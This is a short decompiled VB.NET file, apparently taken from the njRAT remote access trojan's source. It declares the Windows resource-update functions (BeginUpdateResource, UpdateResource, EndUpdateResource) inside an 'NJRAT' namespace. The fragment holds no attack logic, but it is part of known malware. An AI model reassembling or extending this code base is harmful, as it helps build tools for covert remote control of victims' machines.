Imports System
Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports System.Security

Namespace NJRAT
	' Token: 0x0200004B RID: 75
	<SuppressUnmanagedCodeSecurity()>
	Public NotInheritable Class GClass2
		' Token: 0x06000748 RID: 1864 RVA: 0x000020D7 File Offset: 0x000002D7
		<DebuggerNonUserCode()>
		Public Sub New()
		End Sub

		' Token: 0x06000749 RID: 1865
		Public Declare Function BeginUpdateResource Lib "kernel32" (string_0 As String, <MarshalAs(UnmanagedType.Bool)> bool_0 As Boolean) As IntPtr

		' Token: 0x0600074A RID: 1866
		Public Declare Function EndUpdateResource Lib "kernel32" (intptr_0 As IntPtr, <MarshalAs(UnmanagedType.Bool)> bool_0 As Boolean) As <MarshalAs(UnmanagedType.Bool)> Boolean

		' Token: 0x0600074B RID: 1867
		Public Declare Function UpdateResource Lib "kernel32" (intptr_0 As IntPtr, intptr_1 As IntPtr, intptr_2 As IntPtr, short_0 As Short, <MarshalAs(UnmanagedType.LPArray, SizeConst := 0, SizeParamIndex := 5)> byte_0 As Byte(), int_0 As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
	End Class
End Namespace
